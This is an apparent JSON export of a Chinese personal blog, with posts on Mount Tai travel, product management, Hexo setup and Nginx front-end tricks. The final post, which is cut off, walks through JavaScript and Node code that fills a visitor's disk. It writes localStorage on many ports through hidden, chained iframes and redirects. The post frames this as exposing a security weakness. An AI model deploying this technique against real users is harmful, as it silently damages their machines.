[{"title":"泰山游注意事项","date":"2017-05-21T10:05:29.000Z","path":"2017/05/21/泰山游注意事项/","text":"拐杖和雨衣要买，手电筒要带 士力架、牛肉干、红牛、水最少4瓶 从火车站下车做3路公交是最佳选择，它的东终点站是 红门站 ，上泰山的传统路线步行上山；西终点时天地广场（天外村）在此换旅游专车直接到中天门。目前的运行时间是到 晚8：00.出租车 到天外村7.5元，到红门最多12元。住宿我经常去的住在银座旁边齐鲁宾馆讲价大概70双标 8月12号晚上去的已下是我上山亲身经历。 门票127. 当你进去的是你会看见有好多买东西，租大衣，卖香，雨衣，并不想司机和网上说的哪吗样， 大衣不要先租，到南天门在租，一件15，押金一共100.在这里租的容易退与赎回押金，你要是在下面租，退时候不方便。如果方面自己带一件厚的外套就可以了。夏天不太冷最冷也就20度。 雨衣 卖5元 3元 的都有，必买万一下雨了，在中天门南天门贵这也要10元。 多问问，还有便宜点，买个10元的就挺好的啊。拐杖2元一根，可以讲价2元是竹子的。必买 如果是有钱上去坐车到中天门大巴30元在坐索道60元到南天门。然后在爬半小时就到了，我是晚上爬的晚上没有。下来意识一样 ● 注意事项，带够干粮。在旅游区泡面10元也有5元，但是没有水泡所以最好不要带泡面。 ● 水果带一点， 多带水，矿泉水带上5瓶， 在什么康师傅水5元农夫山泉7快，也有2元，是当地山寨水。 我爬这上去，爬着下来，一共用12个小时，赶上下雨，日出没有看见，云海也没有看见，但是真的很壮观，站在高处感觉，只有自己亲身经历才能体会。但是下来的时候天晴了，看着脚下飘着的云，远处的城市。真的好美，再累也是值得的啊。 可参考这篇攻略：http://go.ly.com/youji/2134038.html","tags":[{"name":"旅行","slug":"旅行","permalink":"/tags/旅行/"}]},{"title":"泰山一日游","date":"2017-05-21T09:57:37.000Z","path":"2017/05/21/泰山一日游/","text":"爬山必备物品： 舒适的登山鞋一双，不要新鞋，需要防滑的。凉鞋一双，方便舒适。防雨的长袖冲锋衣和雨衣，保暖又挡雨。帽子一个，遮阳和小雨时候轻微防水。防水密封袋，用来放重要的证件。手电，晚上山上特别黑，需要用到手电。风油精类药品，防蚊虫叮咬。带足吃的牛肉干巧克力等高热量食品，可以随时补充能量。 路线规划：红门 -&gt; 斗母宫 -&gt; 中天门 -&gt; 十八盘 -&gt; 南天门 -&gt; 玉皇顶。 这是经典的夜登泰山路线。晚上10点左右从红门开始登山，一路攀登大约3个小时后，到达中天门，稍事休息继续攀登一个小时左右，到达十八盘，这里的路不好走，要小心脚下。凌晨3点半左右到达南天门，可以在这里休息调整，吃点早饭，在5点之前到玉皇顶看日出就可。下山时，体力不支可以选择坐索道，如果精力旺盛则可以游览其他景点。 红门位于岱宗坊北，红门路北首，东临中溪，西靠大藏岭。宫因岭南崖有红石如门而名，创建时间无考，明清时重修。庙分东西两院，东为弥勒院，西为红门宫，中由飞云阁相连。 斗母宫斗母宫是泰山景区中最为幽静的所在。斗母宫古名“龙泉观”,它临溪而建，分为北、中、南3院，山门面西。钟鼓二楼直接建于宫门两旁并与山门连在一起，来到斗母宫，北看天门依然高挂，遥遥不可及；南望来路，一些低峰矮山却尽在脚下了。 斗母元君，简称斗母，也叫斗姥，是道教崇拜的女神。 中天门中天门是泰山登山东、西两路的交汇点。此处为登顶半程，上下必经之地。中溪山北侧为东溪，俗称大直沟，古为登岱东路，后废弃。泰山古时多虎，古人在坊北建庙祀黑虎神，现庙内塑财神赵公元帅执鞭跨虎，东为仿古茶楼，西南为中溪宾馆，西北为中天门索道站。 十八盘泰山十八盘是泰山登山盘路中最险要的一段，共有石阶1827级，为泰山的主要标志之一。此处两山崖壁如削，陡峭的盘路镶嵌其中，远远望去，恰似天门云梯。泰山之雄伟，尽在十八盘，泰山之壮美，尽在攀登中！ 南天门在山东泰安市泰山上十八盘之尽处，旧称三天门、天门关，海拔1460米，山于此为最危耸，飞龙岩与翔凤岭之间的低坳处，双峰夹峙，仿佛天门自开。元中统五年（1264年）布山道士张志纯创建。门为阁楼式建筑，石砌拱形门洞，额题“南天门”。红墙点缀，黄色琉璃瓦盖顶，气势雄伟。门侧有楹联曰“门辟九霄仰步三天胜迹；阶崇万级俯临千嶂奇观”。 玉皇顶玉皇顶海拔1546米，气势雄伟，拔地而起，有“天下第一山峰”之美誉。是泰山主峰之巅，因峰顶有玉皇庙而得名。玉皇庙始建年代无考，明成化年间重修。主要建筑有玉皇殿、迎旭亭、望河亭、东西配殿等，殿内祀玉皇大帝铜像。神龛上匾额题“柴望遗风”，远古帝王于此燔柴祭天，望祀山川诸神。","tags":[{"name":"旅行","slug":"旅行","permalink":"/tags/旅行/"}]},{"title":"产品经理的作用","date":"2017-05-21T09:54:34.000Z","path":"2017/05/21/产品经理的作用/","text":"对于产品经理的作用，他是这么说的： 哥，你看，铺地砖的时候，地砖都是硬的，如果严丝合缝铺在一起，容易变型，崩裂。所以地砖之间，总需要一些柔性的东西做填充，成为缝隙，保证地板砖的完整。工程师是硬的，客户是硬的，设计是硬的，市场也是硬的，那谁来做柔性的中间层来保证整个链条完整性呢？产品经理！ 我们陪笑，到处跪，哄着，顺着，不是因为我们就是这样的人。我们只是想让正确的事情，持续发生！拉到外面单看做人，好的产品经理，都不是软蛋！ 花更多的时候分析问题，你将会花更少时间去解决问题","tags":[{"name":"产品经理","slug":"产品经理","permalink":"/tags/产品经理/"}]},{"title":"产品经理最重要的能力","date":"2017-05-21T09:47:18.000Z","path":"2017/05/21/产品经理最重要的能力/","text":"产品经理最重要的能力不是某一项技能，而是「让正确的事情相继发生」。 最近发生了两件有趣的发人深省的事情。 第一件是上周发现我们网页上的新闻标题在不同的系统上显示长度不同。有的可以看到完整标题，有的看到少一个字。类似问题不是第一次出现，之前我隐约觉得可能是跟字体的渲染有些关系，只是让负责这条产品线的产品经理去看看。后来大概随口问了一下工程师，工程师没提原因，只是建议我们对字数控制再严格一点，避免不同环境的显示差异。这事儿也就算结了。 上周发现这个问题再次出现时，我突然就有点儿着急了。于是就跟着负责的同事跑到了现场去看。看了两三台机器，大概猜到了问题，回来以后把问题输入 google，一敲回车，点开看了前三条搜索结果就弄清了原委，也找到了更好的解决方案。前前后后花了不到半个小时，解决了一个之前浑浑噩噩一直没解决的问题。 第二件事来自于曾经就职公司的老同事，他是个大概四五年工作经验的产品经理了，聊到他的职责，他充满了愤怒，大概意思就是合作伙伴不靠谱，工程师不靠谱，老板不靠谱。他的想法不能实现，他提的项目大家不用心，他分配的任务大家不配合。 言外之意就是，他已经仁至义尽，但其他人没做好，这可不是他的责任。这两件事情存在我心里不停的发酵，终于促使我想通了一个道理，就是对于产品经理来说，最可贵的能力不是什么沟通、写文档、分析需求。而是「让正确的事情相继发生」。之前听过一句话，是这么说的：「什么是人才？人才就是给他一件事情，他完成了。再给他一件事情，他又完成了」。我当时觉得这句话蠢透了，但现在回想起来，很想给这句话点赞。 当我们的目标只是应付工作任务时，我们会关注职能边界和工作责任。我们做好自己的这一部分，然后等着别人完成属于他们的那一部分，当别人没有按照期望完成工作时，我们就会冷嘲热讽，觉得是他们的无能影响了目标的实现，有意无意的想「事儿成不成无所谓，只要别是我这个环节的责任就行了」。 然后就是推诿，找借口，装无奈，觉得自己英雄无用武之处，黄金被沙粒埋没，被无能和愚蠢的环境、同事、老板、公司制度、公司文化所扼杀。相反，若我们的目标是「让事情发生」，状态就会完全不同。为了让事情发生，就得杀红眼，就得人挡杀人佛挡杀佛。 工程师不理解需求，我们不论是画图、写文档、做原型还是直接表演给他们看，一定要弄到他们理解需求为止；合作伙伴不配合，我们不论是威逼还是利诱，拍桌子红脸还是跪在地下磕响头，一定要弄到他们配合为止；老板不支持，那我们就用最小的代价和完整的逻辑证明你的观点，说服他，没日没夜地说服他，厕所里堵住他说服他，电梯里拖住他说服他，满地打滚，以头抢地，把刀架在自己脖子上说服他；自己团队的同事解决不了的技术或者业务问题，不论是买书自学还是彻夜查资料还是找到其他行业大牛在他楼下跪一夜，一直到想办法找到解决方案为止。 别管什么边界，也别管什么权利——没权利就建立影响力，连影响力也没有就抱着别人的大腿哭着求，如果又不懂得建立影响力，又跪不下去，就别当产品经理了。另外也别太在意和谐，如果目标是让正确的事情发生，那么其他人怎么看待我们，觉得我们是不是傻逼根本就不重要。更别在意不公平，想要做成事，受点委屈太正常了，不要一天到晚苦大仇深，啜泣叹息了。「让正确的事情相继发生」是唯一的标准，用结果说话，过程中吃了多少苦根本不重要。深夜拧亮台灯披上衣服离开熟睡的姑娘，清晨开门回家冲进浴室拿出钳子和针线咬着牙不哼一声取出身体里的弹头，缝合身上的伤口，换上干净衣服。姑娘睁开惺忪的睡眼问你昨晚还顺利吗？你满脸笑容轻轻告诉她，还挺顺利的。 这句话里的另外两个修饰词，一个是「正确」，一个是「相继」。「正确」关乎于自省，能通过自我拷问或其他人的挑战不断修正和完善方案和路线。我参加过无数场评审，评审中的产品经理有两种，一种抵制别人的挑战，或奋起反抗，或冷嘲热讽，另一种热切的期望别人的挑战，甚至加入到对方的阵营中一起挑战自己，完善自己的想法，避免潜在的风险。你猜哪种产品经理后来更牛逼？好的产品经理知错就改，烂的产品经理将错就错，烂到爆的产品经理永远认为自己没错。而「相继」指的是按部就班的能力，刻画美好未来谁都会，凭空捏造一个完美设计的系统也没什么难的。优秀的产品经理能拿住当前的烂摊子，最大限度的利用团队有限的资源和能力，一步一步向着最终的目标前进。 我曾经有幸有机会旁听过一个高级项目的会议，会上公司的大老板说「你们这些产品经理最喜欢拆掉旧房子，去盖新房子，但事情是不能这么做的」。当时我心里并不服气，三年过去，回头想想，深以为然。如果一个美好的未来没有脚踏实地的路线，没有由近及远的计划，那就等于什么都没有。 回头反省文章开头的两件事情，作为产品经理都只是想「完成自己的任务」，觉得剩下的事情不是我们的事儿了，而是别人的责任。最终不但自己失败，整个团队也失败了。遗憾的是，任何一个产品团队的失败，只有一个罪魁祸首，就是产品经理。有句老话叫做：「成功是团队的成功，失败是产品经理的失败」，大是特是。 「让正确的事情相继发生」，就是产品经理的全部工作，如果在这个过程中需要懂技术，就去学技术，需要懂交互，就去学交互，需要懂画图，就去学画图，需要懂公开演讲，就去学公开演讲，需要懂 XX，就去学 XX。团队中，谁都可以说这不是我的职责范围，只有产品经理不行。 觉得冤枉、憋屈、不公平？抓紧时间，赶紧转行。","tags":[{"name":"产品经理","slug":"产品经理","permalink":"/tags/产品经理/"}]},{"title":"Markdown相关","date":"2017-05-21T09:32:37.000Z","path":"2017/05/21/Markdown/","text":"Markdown在线编辑器 MaHua Cmd Markdown 编辑阅读器 - 作业部落出品 Markdown语法 有道云笔记 简书","tags":[{"name":"Markdown","slug":"Markdown","permalink":"/tags/Markdown/"}]},{"title":"Github+Hexo Build personal blogs","date":"2017-05-17T07:19:00.000Z","path":"2017/05/17/Github-Hexo-Build-personal-blogs/","text":"1、环境安装 1.1安装Node和Git Node地址：https://nodejs.org/en/download/Git地址：https://git-scm.com/download/win 安装完成之后输入以下命令，检测是否安装成功 1.2安装Hexo1$ npm install -g hexo 2、添加Blog 2.1在电脑中新建一个名字为[Blog]的文件（比如：D:\\Blog），在目录右健打开Git Bash。 执行git命令，自动在Blog下创建网站所需的文件（可以忽略执行过程中有错误提示）1$ hexo init 1$ npm install 2.2启动服务 执行git命令 1$ hexo server 启动成功，在浏览器中打开 localhost:4000，这时可以看到Hexo已为你生成了一篇blog。 3、部署到GitHub 3.1点击”New repository”，新建一个版本库 输入Repository name:yourname.github.io(yourname与你的注册用户名一致,这个就是你博客的域名了)填完信息点击”Creating repository”，出现下图中信息，到此github版本库创建完成 3.2部署前修改配置文件_config.yml123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:XXX/XXX.github.io.git branch: master 注意：type:repo:branch:后都有3个空格（空格 空格 空格 重要的事说三遍） repo：必须是SSH形式的url（git@github.com:orange365/orange365.github.io.git），不能为HTTPS对应的url 3.3安装所需插件 执行git命令1$ npm install hexo-deployer-git --save 3.4配置gitHub的SSH 通过ssh keys就可以将本地的项目与Github关联起来检查本机ssh key1$ cd ~/.ssh 提示：没使用过Git就会显示：No such file or directory&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用过则会进入到相应目录下，需要再次创建一个新的Key,按照步骤二来操作 步骤一：本机没有ssh keys 生成SSH的Key 执行git命令,将会在C:\\Users\\用户.ssh生成相关文件 [id_rsa.pub]123$ ssh-keygen -t rsa -C \"邮件地址@youremail.com\"Generating public/private rsa key pair.Enter file in which to save the key (/Users/your_user_directory/.ssh/id_rsa):&lt;直接回车&gt; 注意：-C为大写的C接下来会让你输入密码12Enter passphrase (empty for no passphrase):&lt;输入加密串&gt;Enter same passphrase again:&lt;再次输入加密串&gt; 在回车中会提示你输入一个密码，这个密码会在你提交项目时使用，如果为空的话提交项目时则不用输入。这个设置是防止别人往你的项目里提交内容。注意：输入密码的时候没有*字样的，你直接输入就可以了。 步骤二：本机已有ssh keys123456$ cd ~/.ssh$ ssh-keygen -t rsa -C \"yourSecondGithubEmail@email.com\"# Give your second ssh key another name: e.g., github_rsa_2Generating public/private rsa key pair.Enter file in which to save the key:$ github_rsa_2 操作完成后，就可以看见目录下已经多了两个文件，github_rsa_2 和 github_rsa_2.pub 最后看到这样的界面，就成功设置ssh key了： 3.5添加ssh key到Github 搜索本机上的id_rsa.pub文件。或在C:/Users/用户名/.ssh路径下找到该文件，以记事本打开，复制其中的内容。进入自己的Github，右上角头像setting—左边列表SSH keys—Add SSH key。将内容复制到文本框。注意：这时Github会给你的邮箱发送一封邮件，打开邮件确认下就好了。 3.6测试通信1$ ssh -T git@github.com 出现 successfully 则为成功 一台机器上管理多个Github帐号的SSH Key，如只有一个则可忽略跳过 如果你在一台机器使用两个github账号（比如私人账号abc和工作账号xyz），两个帐号用不同的SSH KEY，还需要编辑一下配置文件~/.ssh/config：config文件是后面的步骤中手动生产的，known_hosts文件是后续自动生产的123456789Host personal.github.com HostName github.com User git IdentityFile ~/.ssh/personal_rsa Host work.github.com HostName github.com User git IdentityFile ~/.ssh/work_rsa 解释此配置文件：每个账号单独配置一个Host，每个Host要取一个别名，每个Host主要配置HostName和IdentityFile两个属性即可 Host的名字可以取为自己喜欢的名字，不过这个会影响git相关命令，例如：Host mygithub 这样定义的话，命令如下，即git@后面紧跟的名字改为mygithubgit clone git@mygithub:PopFisher/AndroidRotateAnim.git HostName 这个是真实的域名地址IdentityFile 这里是id_rsa的地址PreferredAuthentications 配置登录时用什么权限认证–可设为publickey,password publickey,keyboard-interactive等User 配置使用用户名 配置完毕，用下面的命令测试一下：123ssh -T git@personal.github.comssh -T git@work.github.com# 注： @符号后面的&quot;personal.github.com&quot;就是在~/.ssh/config文件中指定的&quot;Host&quot;项 多个ssh key 配置完毕 3.7完善个人信息 这时候说明能够通过SSH链接到你的Github了，接下来完善一下你的完善。Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字必须是你的真名，而不是GitHub的昵称。12$ git config --global user.name &quot;Tim&quot; #用户名 $ git config --global user.email &quot;tim@gmail.com&quot; #填写自己的邮箱 3.8发布更新博客1$ hexo d -g 如果失败，请修改配置文件_config.yml。成功则可忽略123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: https://github.com/xxx/xxx.github.io.git branch: master 4、写一篇文章4.1输入创建文章命令，生成一个md文件(/blog/source/_posts/)1$ hexo new \"hello\" 用编辑器打开hello.md文件,编写完后保存 1234567891011title: hellodate: 2017-05-18 12:37:23categories: - 日志 - 二级目录tags: - hello---摘要:&lt;!--more--&gt;正文: 4.2每次部署的步骤，可按以下步骤来进行。hexo clean清除缓存文件 db.json 和已生成的静态文件 public 。 hexo generate生成网站静态文件到默认设置的 public 文件夹。 命令简写：hexo g hexo server启动本地服务器，用于预览主题。默认地址：localhost:4000，命令简写：hexo s hexo deploy部署到设定的仓库。命令简写：hexo d hexo generate进入文件观察模式，实时编译你的文。命令简写：hexo g -w hexo server -p 4001指定地址端口开启预览 hexo命令组合hexo clean &amp;&amp; hexo g &amp;&amp; hexo s，就是清除、生成、启动hexo clean &amp;&amp; hexo g -d，就是清除、生成、部署 进阶利用package.json的scripts来搞点事情123456&quot;scripts&quot;: &#123; &quot;server&quot;: &quot;hexo server -i localhost -p 4001&quot;, &quot;watch&quot;: &quot;hexo g -w&quot;, &quot;deploy&quot;:&quot;hexo D&quot;, &quot;dev&quot;: &quot;npm run server &amp;&amp; npm run watch&quot;&#125; 将上述代码写在package.json里，就可以通过npm run server来开启服务通过npm run watch来启动文件观察模式通过npm run deploy来部署博客当然，最最主要的是可以通过npm run dev同时开启服务和观察模式 5、更换博客主题1) 从 Github 上将主题下载下来，放到 /themes 目录下：1$ git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant 2) 安装主题和渲染器：12$ npm install hexo-renderer-jade --save$ npm install hexo-renderer-sass --save 3) 编辑博客目录下的 _config.yml 文件，将 theme 的值改为 maupassant。4) 接着就是执行 hexo clean，hexo generate，hexo deploy 三部曲了。 另外这个主题也是挺不错的，https://github.com/litten/hexo-theme-yilia最后，附上更多的hexo主题，大家可以狠戳这里选择你自己喜好的主题。","tags":[{"name":"hexo博客","slug":"hexo博客","permalink":"/tags/hexo博客/"}]},{"title":"旧事 哪天才能歌唱的话 10.30-11.05","date":"2016-11-06T02:36:00.000Z","path":"2016/11/06/diary-2016-1030-1105/","text":"想起网易账户密码泄露，就发生在10月底。去年的这个时候，我是受害者之一。 但我没有着急改密码。一是因为那个时候，我过着一种近乎抑郁灰白的生活。所有的社交工具都停掉了，也不与人交流。很多事情我不愿碰。像燃尽的烟柱，自己伸手一掸，搞不好满世界尘埃还不如让风来悄悄瘗埋。 二是因为一位神秘的朋友闯进了生活。我很喜欢冲绳民谣，在云音乐里上传了BEGIN的《三线の花》与《笑颜不变》。这位朋友搞到我的账号密码后，貌似没做什么坏事，光给我推荐歌曲了…TA先上传了没有版权的《岛人ぬ宝》，再后来是夏川和中孝介的一些歌。那时，这些音乐，居然成了我跟外界连通的唯一绳索。 有个晚上狂风暴雨，我在深大门口已经等了一小时的车。最终回到家，直接把湿透的身体，躺在花纹诡异的瓷砖上。耳边传来中孝介备受摧残的声音…太爽了。也许世界虚无和冰冷，但我可以若无其事。人生苦短，真理靠边站。 深呼吸。过了午夜，可以，重新开始。 喜びも悲しみも いつの日か唄えるなら无论喜悦还是悲伤 要说哪天才能歌唱的话この島の土の中 秋に泣き冬に耐え在这座岛的土里 泣于深秋 忍受寒冬春に咲く 三線の花春天绽放 三线之花","tags":[{"name":"旧事","slug":"旧事","permalink":"/tags/旧事/"}]},{"title":"Nginx能为前端开发带来什么？","date":"2015-11-03T13:30:00.000Z","path":"2015/11/03/nginx-in-fe/","text":"Nginx那么好，我想去看看。接连逛了两个书城后，我发现并没有Nginx相关的书籍。这就很奇怪！ Nginx，一名网红（网络服务器红人…），就算没有自传和回忆录，争着介绍它的花边新闻也该有吧。 后来找到仅有的一两本书籍，也直接深入到“源码剖析”的阶段。写得并不十分满意，况且我还不需要这些。后来发现了原因，大概是因为“使用太简单了，都不值得出书”。是的，Nginx把纷繁复杂的功能，浓缩成一份简单的配置，极易上手。当它呈现到你面前时，感觉独具匠心。 Nginx与NodeJs（这里的标题有点歧义。此处的NodeJs，皆引申为NodeJs所搭建的服务器。） 有人说，作为一名前端，我的真爱是NodeJs。同时也认同，抛去性能之类的比较，单纯从实现的角度，NodeJs编写的服务器也能实现Nginx的各种功能。 这些我都赞成，但使用Nginx并不意味着抛弃NodeJs。事实上，它们并不冲突，还可以在一起愉快的玩耍。 在业内，这样的模型已很常见：资源转发，反向代理，静态资源处理，负载均衡，这些事情扔给Nginx来处理，只是几行配置的事情；同时在上游，让NodeJs去处理它最擅长的I/O等事情。 合理分配各自擅长的事情，这样的思路，同样可以运用于前端开发中。 以前用NodeJs几百行实现的服务器功能，在npm与github的海洋里花尽心思去寻找的模块，也许在Nginx里是一条成熟的配置。它能帮其分担很多事情，节约了成本。 场景一：环境切换前端开发中，经常面临多个部署环境切换的问题。我们通常用配hosts的方式去实现。更优化些，我们将机器的服务绑定了不同的域名：比如正式环境是a.qq.com，测试环境是test.a.qq.com。 然而在拓展性和易用性方面，还不足够好。而Nginx作为反向代理，就很容易处理资源转发的问题。 思路很简单： 读取请求里的cookie，如果键名host_id有值，则代理到这个IP地址； 如果没有，则代理到默认的正式环境（此处举例为1.1.1.1）; 123456789set $env_id &quot;1.1.1.1&quot;;if ( $http_cookie ~* &quot;host_id=(\\S+)(;.*|$)&quot;) &#123; set $env_id $1;&#125;location / &#123; proxy_set_header Host $host; proxy_pass http://$env_id:80;&#125; 那接下来的事情，就是怎样用最简便的方式，把IP种在cookie里？我们应用了nginx-http-footer-filter模块，html文件经过代理时，都注入了一小段js代码。 这段代码，会帮我们展示小菜单，点击某个环境时，则将IP种到cookie里，同时刷新页面，让Nginx完成环境切换。 切换环境，如今只需点击一次。 场景二：SourceMap在线上环境调试Js代码是件麻烦的事情，因为目前合格的前端部署，代码都应经过压缩。性能问题是优化了，debug可不怎么方便。 而SourceMap正好可以解决此问题。 在最新的各版本浏览器里，如果满足： 压缩后的js文件后面有//# sourceMappingURL=xxx.map格式的注释 浏览器能正常访问到sourceMappingURL 那么，就能把压缩过的代码还原。要实现这样的功能，就必须： 现网环境不带以上形式的注释，同时访问不到sourceMap（安全性考虑） 测试环境带注释，能访问sourceMap 这样的模型，用反向代理+内容纂改的思路再合适不过。每次构建编译时，我们会把sourceMap文件存放到一台机器（举例为1.1.1.1），命名为js文件名后加.map后缀。随后，使用Nginx，通过这几行配置就能把此功能实现： 1234location ~ \\.js$ &#123; footer &quot;\\n//# sourceMappingURL=$request_uri.map&quot;; footer_types &quot;*&quot;;&#125; 只要经过代理，在chrome里，我们能看到每份被压缩过的js文件，都有一个对应的源码文件。你可以直接使用它来做打断点之类的操作，大大的提升了调试质量。 场景三：内容纂改其实在以上两个场景里，都涉及了“内容纂改”。无论是说“纂改”还是“劫持”，大家的印象都不是什么好事情，但另一方面，他们又可以让事情有趣起来。 统一介绍下，Nginx涉及纂改的模块有： nginx_http_footer_filter：往文件的底部添加文字，可包含Nginx的内置变量； nginx_http_addition_module：从一个url去读取内容，将之添加到文件的头部或顶部； nginx_http_sub_module：替换字符 除去上面两种场景，合理运用这些模块对应的配置，可以做出许多小工具，这是很有想象力的事情。单单针对移动web前端开发，就可以实现： 将weinre脚本插入到html里，让移动web调试更加便捷。 移动web经常用到localStorage优化首屏，但debug时又会受到干扰，通过一个按钮很方便的清除本地缓存。 手机APP内嵌页面，很难将其网址分享给另一个人。通过一个按钮就能生成url对应的二维码等 场景四：本地映射在Windows下的前端抓包调试，Fiddler+Willow的能力毋庸置疑。而脱离了.NET体系的Linux和Mac，即使有一些代替工具，但某些方面还是略显不足。 比如：线上接口映射到本地文件。想到Fiddler的本质也是一个代理，而开启一个有这样能力的Nginx服务，并不是太难的事情。 而且，我们可以做得更灵活，比如： 同时支持慢速调试 同时支持目录层级映射 同时支持正则匹配 JSON返回的数据有可能是变化的（比如分页时候），同时支持动态数据 这些场景，只运用到Nginx里的“rewrite规则”。从参考的文档可以大致看到，rewrite规则非常灵活，能完成各种场景的转发。 最简单的模型中，我们把所有带cgi-bin路径的请求，rewite到本地的一个服务，同时带上请求的所有参数，仅需这三行配置即可：123location ~ /cgi-bin/* &#123; rewrite ^(.*)$ http://127.0.0.1:8080/cgi-bin/ last;&#125; 后续的事情，可以在本地创建一个cgi-bin文件夹，在里面放置需要映射的文本，并开启服务到8080端口即可。 场景五：移动侧调试Fiddler 有一个勾选项 Allow remote computers to connect，并可以指定 listen port 可以使得手机/其它终端通过将本机设为代理而访问本机环境，与 hosts 配合会很实用。 这个功能，用Nginx也很容易做到。通过 default_server 作为代理，手机终端通过设置网络代理为本机IP和相应的 listen port，从而可以访问本机的 Web 服务。 其中也是用到了ngx_http_proxy_module模块的配置：12345678910111213141516171819202122 server &#123; listen 80 default_server; server_name localhost; resolver 8.8.8.8; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://$host; &#125;&#125;server &#123; listen 80; server_name ke.qq.com; location / &#123; proxy_set_header Host $host; proxy_set_header X-Real-Ip $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; proxy_pass http://127.0.0.1:9091/; &#125;&#125; 边角料除去特定场景，Nginx的一些配置也跟前端息息相关。以下简单罗列，作为边角材料。 1.nginx_http_concat资源合并，处理CDN combo。例如通过这样的方式http://example.com/??style1.css,style2.css,foo/style3.css访问合并后的资源。 2.ngx_http_image_filter_module图片处理。提供图片缩放，jpg压缩，旋转等特性。 3.适配PC与移动web总体可运用ngx_http_proxy_module，去实现路径转发。判断平台类型的Nginx配置，在开源项目detectmobilebrowsers中可以找到。 后记学习Nginx，我本身只是出于开开眼界的目的。而的确发现了一些很有启发性的特质。于前端开发，无论线上线下，熟练掌握基本配置，可以做出许多提高效率的工具。但既然是工具，熟手就好。 比如Fiddler直观，但Nginx更底层，更灵活，应当按照实际选择即可。 话说回来，后来心情有些惆怅。想起之前，我用NodeJs写过一个八百行的本地调试服务，如今更习惯用Nginx的几行配置。不过我又想，既然我已经花了时间去写，为什么还要花时间去用？！ 心情又好起来了。（等等有什么不对，管它呢…） END.15.11.03 Litten.","tags":[{"name":"前端","slug":"前端","permalink":"/tags/前端/"}]},{"title":"作为一个前端，可以如何机智地弄坏一台电脑？","date":"2015-07-06T14:30:00.000Z","path":"2015/07/06/hack-in-localstorage/","text":"有人说，前端的界限就在浏览器那儿。 无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。然而，作为一个前端，我发现是有方式打开次元大门的… 这个实验脑洞较大，动机无聊，但某种意义上反映了一些安全问题。想象一下，有天你在家里上网，吃着火锅还唱着歌，点开一个链接，电脑突然就蓝屏了！想想还真有点小激动。 起因故事得从localStorage说起。 html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。windows下的chrome，localStorage存储于C:\\Users\\xxx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。 对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。 那么问题就变成：这样的限制足够保护用户硬盘了吗？ 关键关键的问题在于，这一限制，针对的是一个域名+端口。也就是说，你访问同一个域名的不同端口，它们的localStorage并无关联，是分开存储的。 我用node简单地开启了服务器，这时，用户访问http://127.0.0.1:1000到http://127.0.0.1:1099这100个端口，会请求到同一个页面：index.html： 1234567891011121314151617var http = require(&apos;http&apos;);var fs = require(&apos;fs&apos;);//100个端口for(var port = 1000; port&lt; 1100; port++)&#123; http.createServer(function (request, response) &#123; //请忽略这种循环读文件的方式，只为了简便 fs.readFile(&apos;./index.html&apos;, function(err, content)&#123; if(err) &#123; &#125; else &#123; response.writeHead(200, &#123; &apos;Content-Type&apos; : &apos;text/html; charset=UTF-8&apos; &#125;); response.write(content); response.end(); &#125; &#125;); &#125;).listen(port, &apos;127.0.0.1&apos;);&#125; 当然，这个index.html里涉及了localStorage写操作。 123456var s = &quot;&quot;;//慢慢来，别写太大了，好害怕…for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;;&#125;localStorage.setItem(&quot;testData&quot;, s); 我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。 自动遍历但这种程度还不够。如果要实验变得更好（xie）玩（e）一些，问题就变成如何让用户自动遍历这些端口？ iframe是个好的尝试。只要一打开http://127.0.0.1: 1000，页面的脚步就会创建一个iframe，去请求http://127.0.0.1: 1001，一直循环下去。 1234567891011121314151617181920212223var Main = (function()&#123; var _key = &quot;testData&quot;; var _max = 1100; //最大限制 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = &quot;&quot;; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; //新添加iframe var url = &quot;http://127.0.0.1:&quot; + port; var $iframe = document.createElement(&quot;iframe&quot;); $iframe.src = url; document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe); &#125; &#125;&#125;)(); 当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。 然后我就看到请求如潮水渐涨： 但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。 ###防止浏览器崩溃 C盘还未撑满，同志还需努力。怎么办？ 突然想到，到达iframe极限之前，我们可以重定向啊。每访问50个端口，就使用window.location.href重定向一次，去确保浏览器不崩溃。 1234567891011121314151617181920212223242526272829var Main = (function()&#123; var _key = &quot;testData&quot;; var _max = 1200; //最大限制 var _jumpSpace = 50; //为避免iframe过多导致浏览器crash，每50个执行跳转 return &#123; init: function()&#123; //慢慢来，别写太大了，好害怕… var s = &quot;&quot;; for(var i=0; i&lt; 3 * 1024 * 1024; i++)&#123; s += &quot;0&quot;; &#125; localStorage.setItem(_key, s); var port = parseInt(location.port)+1; if(port &gt; _max) return; if(port % _jumpSpace == 0)&#123; //每50个，重定向一次 window.location.href = url; &#125;else&#123; //新添加iframe var $iframe = document.createElement(&quot;iframe&quot;); $iframe.src = url; document.getElementsByTagName(&quot;body&quot;)[0].appendChild($iframe); &#125; &#125; &#125;&#125;)(); 事实证明，这种蛮拼的方法的确可行。 